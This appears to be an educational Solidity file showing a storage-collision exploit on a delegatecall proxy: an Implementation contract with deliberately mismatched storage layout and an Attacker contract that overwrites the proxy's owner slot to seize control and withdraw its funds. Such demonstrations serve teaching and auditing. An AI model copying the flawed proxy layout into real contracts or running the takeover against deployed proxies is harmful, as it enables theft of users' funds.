// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Proxy {

    uint public myValue;
    address public owner;
    address public implementationAddress;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not auth");
        _;
    }

    function setImplementationAddress(address _addr) external onlyOwner {
        implementationAddress = _addr;
    }

    fallback() external payable {
        (bool s, ) = implementationAddress.delegatecall(msg.data);
        require(s, "Failed call");
    }

    /**

    We will comment out the receive() function to account for older versions of solidity + receive is not an enforced function.
    Compiler will give warning.

    receive() external payable {}

    */

    function withdrawFunds() external onlyOwner {
        (bool s, ) = payable(owner).call{value: address(this).balance}("");
        require(s, "Failed withdraw");
    }
    
}

contract Implementation {

    uint public myValue;
    uint public mathValue; // notice this ordering does not match Proxy contract. Results in exploit.
    address public owner;
    address public implementationAddress;

    function payAndIncreaseValue() external payable {
        myValue++;
    }

    function setMathValue(uint _val) external {
        mathValue = _val;
    }
}

contract Attacker {
   
    address public owner;
    address public proxyContract;

    constructor(address _addr) {
        owner = msg.sender;
        proxyContract = _addr;
    }

    function takeOverProxyOwnership() external {
        require(msg.sender == owner, "Not auth");
        // pass msg.sender casted to uint256
        (bool s, ) = proxyContract.call(abi.encodeWithSignature("setMathValue(uint256)", uint256(uint160(msg.sender))));
        require(s, "Failed takeover");
    }

}